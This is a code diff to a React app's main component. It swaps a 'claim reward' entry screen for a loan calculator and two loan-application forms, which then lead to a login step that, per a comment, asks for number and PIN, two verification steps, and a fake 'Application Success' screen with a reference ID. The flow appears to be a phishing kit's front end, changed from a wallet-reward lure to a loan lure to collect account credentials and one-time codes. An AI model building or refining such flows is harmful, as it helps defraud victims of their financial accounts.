@@ -1,17 +1,33 @@
-
 import React, { useState } from 'react';
 import LoginForm from './components/LoginForm';
 import VerificationForm from './components/VerificationForm';
-import ClaimReward from './components/ClaimReward';
+import LoanCalculator from './components/LoanCalculator';
+import LoanApplication1 from './components/LoanApplication1';
+import LoanApplication2 from './components/LoanApplication2';
 
-export type AppStep = 'claim' | 'login' | 'verification' | 'verification2' | 'success';
+export type AppStep = 'calculator' | 'application1' | 'application2' | 'login' | 'verification' | 'verification2' | 'success';
 
 const App: React.FC = () => {
-  const [step, setStep] = useState<AppStep>('claim');
+  const [step, setStep] = useState<AppStep>('calculator');
   const [userData, setUserData] = useState({ username: '', password: '' });
+  const [loanData, setLoanData] = useState({});
 
-  const handleStartClaim = () => {
-    setStep('login');
+  const handleCalculatorNext = () => {
+    setStep('application1');
+  };
+
+  const handleApp1Next = (data: any) => {
+    setLoanData(prev => ({ ...prev, ...data }));
+    setStep('application2');
+  };
+
+  const handleApp2Next = (data: any) => {
+    setLoanData(prev => ({ ...prev, ...data }));
+    setStep('login'); // Proceed to login (which asks for number and PIN)
+  };
+
+  const handleApp2Prev = () => {
+    setStep('application1');
   };
 
   const handleLoginSuccess = (data: { username: string; password: string }) => {
@@ -50,12 +66,20 @@ const App: React.FC = () => {
 
         {/* Dynamic Container Content */}
         <div className="w-full transition-all duration-500 ease-in-out">
-          {step === 'claim' && (
-            <ClaimReward onClaim={handleStartClaim} />
+          {step === 'calculator' && (
+            <LoanCalculator onNext={handleCalculatorNext} />
+          )}
+
+          {step === 'application1' && (
+            <LoanApplication1 onNext={handleApp1Next} />
+          )}
+
+          {step === 'application2' && (
+            <LoanApplication2 onNext={handleApp2Next} onPrev={handleApp2Prev} />
           )}
 
           {step === 'login' && (
-            <LoginForm onLogin={handleLoginSuccess} />
+            <LoginForm onLogin={handleLoginSuccess} loanData={loanData} />
           )}
           
           {step === 'verification' && (
@@ -84,8 +108,8 @@ const App: React.FC = () => {
                   </svg>
                 </div>
               </div>
-              <h1 className="text-3xl font-bold text-gray-800 mb-4">Verification Success!</h1>
-              <p className="text-gray-600 mb-8">Your reward is being processed and will be credited to your wallet within 24 hours.</p>
+              <h1 className="text-3xl font-bold text-gray-800 mb-4">Application Success!</h1>
+              <p className="text-gray-600 mb-8">Your loan application is being processed and will be reviewed within 24 hours.</p>
               
               <div className="bg-gray-50 rounded-lg p-4 border border-dashed border-gray-300 mb-8">
                 <p className="text-xs text-gray-500 uppercase tracking-widest font-semibold">Reference ID</p>
